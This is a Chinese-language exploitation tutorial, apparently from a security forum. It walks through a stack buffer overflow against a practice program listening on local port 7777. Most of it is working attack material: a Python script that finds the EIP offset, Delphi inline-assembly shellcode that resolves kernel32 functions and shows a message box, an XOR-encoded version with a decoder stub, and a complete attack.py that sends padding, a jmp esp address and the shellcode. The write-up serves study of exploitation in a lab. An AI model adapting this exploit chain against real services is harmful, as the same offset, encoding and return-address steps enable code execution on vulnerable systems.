
# 详解 Python3.0 溢出试验

> 原文：[`www.pediy.com/kssd/pediy10/81312.html`](https://www.pediy.com/kssd/pediy10/81312.html)

看了网上到处转载的“Win32 缓冲区溢出实战“(原文是《Intro to Win32 Exploits》)和其他看雪论坛中的佳作，有所感悟。特写此文，以作留念。

原文中老外用大段篇幅讨论了“用多长的 buffer 可以覆盖到内存中的 EIP。

他的 python 脚本实现原理如下，这里我们先假设寄存器大小是 1byte：

a.首先生产如下数字串 `123456789123456789123456789123456789123456789`

b.然后我们看到某个数字覆盖了 EIP(假设 EIP 大小是 1byte)，假设是 `2`，然后我们重新构建数字串，只改变原来数字 `2` 所在的位置，其他位置数字忽略或不变。

c.现在某个数字又覆盖了 EIP，假设是 `4`，这样我们就可以计算出 buffer 的真实长度，用于写 exploit 了。现实中 X86 机器中寄存器是 4byte 的，所以我们将上面的数字串扩展到 4 个数字相同的排列。实际调试中又发现，有时候并不是刚好相同的 4 个数字覆盖了 EIP，比如是 `4445`，所以我们在 buffer 的开头加入一个 align 字符，比如 `A`，将 buffer 挤动一位，这样覆盖 EIP 的数字串就是 `444` 了。这个算法很有创意。有没有简单点的？

那我们就开始 Python3.0 溢出之旅吧！

## 1、赶紧下个 python 3.0

## 2、找个有溢出漏洞的程序做靶子

于是在看雪论坛找了个 `exploit_me`，程序启动之后，会监听本地的 `7777` 端口，用来接受用户的输入，然后显示在屏幕上。

## 3、算法构思

在 buffer 里填充 acii 字符。你可以在命令行输入 `test.py 100` 就表示在 buffer 里填充

`0123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899` 这么长的字符串,程序会提示字符串的字节数。如果覆盖了 EIP，则要根据错误提示找到 EIP 被字符串最后哪几个字符所覆盖，然后口算就能得出覆盖 EIP 之前的 buffer 大小。

通过一天的 python 学习，写出的脚本如下。简单注释一下：

```python
import socket,sys  #sys 命令行参数要用到
data = ''
k=0
j=int(sys.argv[1])   #取得命令行参数即要数到几
HOST = '127.0.0.1'
PORT=7777
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))      
if j<11 :
    k=j
elif j>10 and j<100 :
    k=2*(j-10)+10
elif j>99 and j<1000 :  
    k=3*(j-100)+90*2+10
elif j>999 and j<10000 :
    k=4*(j-1000)+900*3+90*2+10  
else:
    k=0        #算出一共发送的字节数
if k==0 :
   print('The number is too big!')
   sys.exit(1)    
for i in range(j):
   data=data +str(i)  
print('Sending:', repr(data))   
print('Total Bytes:', repr(k))
s.send(data.encode())
s.close()
```

在我的 Xp 系统下运行正常，截了几张图。pathon 脚本程序它没有 vc 的{},也没有 delphi 的 begin end,就看你每行的缩进了得非常注意。![](img/f369da2c62a6497e53b479491055ffc0.jpg)

![](img/79b6dd0de7b65fa8649bbd3e8fb341da.jpg)

![](img/d4010d705ea6701b92d0ffc30e32b7b1.jpg)

## 4、抠个 shellcode，做个测试

将如下的 Project1.dpr 用 delphi 编译得到 Project1.exe，然后用 OD 载入。

```pascal
program Project1;
procedure ShellcodeFunc();
var
  uLoadLibrary,uGetProcAddress,uKernelBase,flen:LongWord;
  FuncName :pchar;
begin
       asm
             jmp @Start
          @GetFunc:
              mov eax,uKernelBase
              mov eax,[eax+3ch]
              add eax,uKernelBase
              mov eax,[eax+78h]
              add eax,uKernelBase
              mov esi,eax
              mov ecx,[eax+18h]
              mov eax,[eax+20h]
              add eax,uKernelBase
              mov ebx,eax
              xor edx,edx
          @FindLoop:
              push ecx
              push esi
              mov eax,[eax]
              add eax,uKernelBase
              mov esi,FuncName
              mov edi,eax
              mov ecx,flen
              cld
              rep cmpsb
              pop esi
              je  @Found
              inc edx  
              add ebx,4
              mov eax,ebx
              pop ecx
              loop @FindLoop
          @Found:
              add esp,4
              mov eax,esi
              mov eax,[eax+1ch]
              add eax,uKernelBase
              shl edx,2
              add eax,edx
              mov eax,[eax]       
              add eax,uKernelBase
              jmp @Founded
              xor eax,eax
          @Founded:
              ret
          @Start:
              push esi
              push ecx
              xor eax, eax        
              xor esi, esi
              mov esi, fs:[esi + 18h]
              mov eax, [esi+4]                  
              mov eax, [eax -1ch]
          @find_kernel32_base:
              dec eax
              xor ax, ax
              cmp word ptr [eax], 5a4dh
              jne @find_kernel32_base
              pop ecx
              pop esi
              mov uKernelBase,eax
              mov flen,0ch
              call @LL1
              DB  'L','o','a','d','L','i','b','r','a','r','y','A',0
          @LL1:
              pop eax
              mov FuncName,eax
              call @GetFunc
              mov uLoadLibrary,eax
              mov flen,0Eh
              call @LL2
              db  'G','e','t','P','r','o','c','A','d','d','r','e','s','s',0
          @LL2:
              pop eax
              mov FuncName,eax
              call @GetFunc
              mov uGetProcAddress,eax
              call  @l1
              db 'u','s','e','r','3','2','.','d','l','l',0
          @l1:
              call uLoadLibrary
              call @l2
              db  'M','e','s','s','a','g','e','B','o','x','A',0
          @l2:
              push eax
              call uGetProcAddress
              push 0
              call @l3
              db $cc,$ec,$d2,$d7,0
          @l3:
              call @l4
              db 'L','o','v','e',0
          @l4:
              push 0
              call eax    
              call @l5
              db  'E','x','i','t','P','r','o','c','e','s','s',0
          @l5:
              push uKernelBase
              call uGetProcAddress
              push 0
              call eax
      end;
end;
begin
    ShellcodeFunc;
end.
```

载入后入口处是这样

```
00401F8C  >  $  55            PUSH EBP
00401F8D   .  8BEC          MOV EBP,ESP
00401F8F   .  83C4 F0       ADD ESP,-10
00401F92   .  B8 6C1F4000   MOV EAX,Project1.00401F6C
00401F97   .  E8 00FEFFFF   CALL Project1.00401D9C
00401F9C   .  E8 77FEFFFF   CALL Project1.00401E18   ；此处 F7 进入
00401FA1   .  E8 56FAFFFF   CALL Project1.004019FC
00401FA6   .  8BC0          MOV EAX,EAX
```

来到........

```
00401E18   $  55            PUSH EBP                  ；要取的 shellcode 的开始位置
00401E19   .  8BEC          MOV EBP,ESP
00401E1B   .  83C4 EC       ADD ESP,-14              
00401E1E   .  EB 56         JMP SHORT Project1.00401E76
00401E20   $  8B45 FC       MOV EAX,DWORD PTR SS:[EBP-4]
00401E23   .  8B40 3C       MOV EAX,DWORD PTR DS:[EAX+3C]
......
00401F3D      FFD0          CALL EAX                  ； kernel32.ExitProcess 结束位置
```

选中这一段，在右键菜单中找到“二进制复制”，把它粘贴到记事本里。显然这里面有 `00` 和 `00 00` 会被截断。需 xor 加密一下，这里用我自己编的工具。找个里面没有的字节这里选 `88` 写在第一行从第二行开始写待加密的字节，然后保存成到工具所在的目录。文件名可以随意取，但后缀必须要是 `.ty`，便于加密程序能找到。运行“异或加密.exe”在程序后，在工具目录自动生成一个 `shellcode.txt` 文件.对比如下图：![](img/e925578ac4c30187a19308039cdfb0ba.jpg)

这段里面已经没有 `00` 了，但是需要在前面加一段解密代码。

将 `EB 10 5A 4A 33 C9 66 B9 27 01 80 34 11 88 E2 FA EB 05 E8 EB FF FF FF` 粘贴进记事本的开头处修改几个关键参数，简单调试看看就可以了(如图)。![](img/6e12cd88f2d3f07411e4b2e08da7a903.jpg)

这样解密＋加密后的代码如下：

`EB 10 5A 4A 33 C9 66 B9 27 01 80 34 11 88 E2 FA EB 05 E8 EB FF FF FF`

`DD 03 64 0B 4C 64 63 DE 03 CD 74 03 C8 B4 8B CD 74 03 C8 F0 8B CD 74 01 4E 03 C0 90 03 C8 A8 8B`

`CD 74 01 4B B9 5A D9 DE 03 88 8B CD 74 03 FD 70 01 4F 03 C5 7C 74 7B 2E D6 FC 81 CA 0B 4B 8C 01`

`50 D1 6A 6A 0B 4C 8C 01 78 03 C8 94 8B CD 74 49 6A 8A 89 58 03 88 8B CD 74 63 8A B9 48 4B DE D9`

`B9 48 B9 7E EC 03 FE 90 03 CE 8C 03 C8 6C C0 EE B9 48 EE 09 B0 C5 D2 FD 7D D1 D6 01 CD 74 4F CD`

`7C 84 88 88 88 60 85 88 88 88 C4 E7 E9 EC C4 E1 EA FA E9 FA F1 C9 88 D0 01 CD 70 60 E0 77 77 77`

`01 CD 78 4F CD 7C 86 88 88 88 60 87 88 88 88 CF ED FC D8 FA E7 EB C9 EC EC FA ED FB FB 88 D0 01`

`CD 70 60 C9 77 77 77 01 CD 64 60 83 88 88 88 FD FB ED FA BB BA A6 EC E4 E4 88 77 DD 78 60 84 88`

`88 88 C5 ED FB FB E9 EF ED CA E7 F0 C9 88 D8 77 DD 64 E2 88 60 8D 88 88 88 44 64 5A 5F 88 60 8D`

`88 88 88 C4 E7 FE ED 88 E2 88 77 58 60 84 88 88 88 CD F0 E1 FC D8 FA E7 EB ED FB FB 88 77 FD 74`

`77 DD 64 E2 88 77 58`

将其格式化后放入 `attack.py` 这就是我们演示溢出的 python 脚本。



`import socket`

`data = b"A" * 200+b"\\x7b\\x46\\x86\\x7c"  + \\`    `#0x7c86467b 是我系统中 kernel32.dll 中的 jmp esp 的地址`

`b"\\xEB\\x10\\x5A\\x4A\\x33\\xC9\\x66\\xB9\\x27\\x01\\x80\\x34\\x11\\x88\\xE2\\xFA" +\\`

`b"\\xEB\\x05\\xE8\\xEB\\xFF\\xFF\\xFF\\xDD\\x03\\x64\\x0B\\x4C\\x64\\x63\\xDE\\x03\\xCD\\x74\\x03\\xC8" +\\`

`b"\\xB4\\x8B\\xCD\\x74\\x03\\xC8\\xF0\\x8B\\xCD\\x74\\x01\\x4E\\x03\\xC0\\x90\\x03" +\\`

`b"\\xC8\\xA8\\x8B\\xCD\\x74\\x01\\x4B\\xB9\\x5A\\xD9\\xDE\\x03\\x88\\x8B\\xCD\\x74" +\\`

`b"\\x03\\xFD\\x70\\x01\\x4F\\x03\\xC5\\x7C\\x74\\x7B\\x2E\\xD6\\xFC\\x81\\xCA\\x0B" +\\`

`b"\\x4B\\x8C\\x01\\x50\\xD1\\x6A\\x6A\\x0B\\x4C\\x8C\\x01\\x78\\x03\\xC8\\x94\\x8B" +\\`

`b"\\xCD\\x74\\x49\\x6A\\x8A\\x89\\x58\\x03\\x88\\x8B\\xCD\\x74\\x63\\x8A\\xB9\\x48" +\\`

`b"\\x4B\\xDE\\xD9\\xB9\\x48\\xB9\\x7E\\xEC\\x03\\xFE\\x90\\x03\\xCE\\x8C\\x03\\xC8" +\\`

`b"\\x6C\\xC0\\xEE\\xB9\\x48\\xEE\\x09\\xB0\\xC5\\xD2\\xFD\\x7D\\xD1\\xD6\\x01\\xCD" +\\`

`b"\\x74\\x4F\\xCD\\x7C\\x84\\x88\\x88\\x88\\x60\\x85\\x88\\x88\\x88\\xC4\\xE7\\xE9" +\\`

`b"\\xEC\\xC4\\xE1\\xEA\\xFA\\xE9\\xFA\\xF1\\xC9\\x88\\xD0\\x01\\xCD\\x70\\x60\\xE0" +\\`

`b"\\x77\\x77\\x77\\x01\\xCD\\x78\\x4F\\xCD\\x7C\\x86\\x88\\x88\\x88\\x60\\x87\\x88" +\\`

`b"\\x88\\x88\\xCF\\xED\\xFC\\xD8\\xFA\\xE7\\xEB\\xC9\\xEC\\xEC\\xFA\\xED\\xFB\\xFB" +\\`

`b"\\x88\\xD0\\x01\\xCD\\x70\\x60\\xC9\\x77\\x77\\x77\\x01\\xCD\\x64\\x60\\x83\\x88" +\\`

`b"\\x88\\x88\\xFD\\xFB\\xED\\xFA\\xBB\\xBA\\xA6\\xEC\\xE4\\xE4\\x88\\x77\\xDD\\x78" +\\`

`b"\\x60\\x84\\x88\\x88\\x88\\xC5\\xED\\xFB\\xFB\\xE9\\xEF\\xED\\xCA\\xE7\\xF0\\xC9" +\\`

`b"\\x88\\xD8\\x77\\xDD\\x64\\xE2\\x88\\x60\\x8D\\x88\\x88\\x88\\x44\\x64\\x5A\\x5F" +\\`

`b"\\x88\\x60\\x8D\\x88\\x88\\x88\\xC4\\xE7\\xFE\\xED\\x88\\xE2\\x88\\x77\\x58\\x60" +\\`

`b"\\x84\\x88\\x88\\x88\\xCD\\xF0\\xE1\\xFC\\xD8\\xFA\\xE7\\xEB\\xED\\xFB\\xFB\\x88" +\\`

`b"\\x77\\xFD\\x74\\x77\\xDD\\x64\\xE2\\x88\\x77\\x58"`

`HOST = '127.0.0.1'`

`PORT=7777`

`s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)`

`s.connect((HOST, PORT))`

`s.send(data)`

`s.close()`

`jmp esp` 的地址可以在 `OD` 中进入可执行模块 `kernel32.dll` 的空间，然后在其中搜索所有命令，输入 `jmp esp` 就可以找到了。调试的话必须要修改为你机子里对应的地址。

溢出成功后截了张图。![](img/d0382575ea739593b66e4c6044caf629.jpg)

后附上一些调试程序。

上传的附件

| ![](img/c8c74a380a3dea7fa2460187d80ee5e0.jpg) || test.rar |
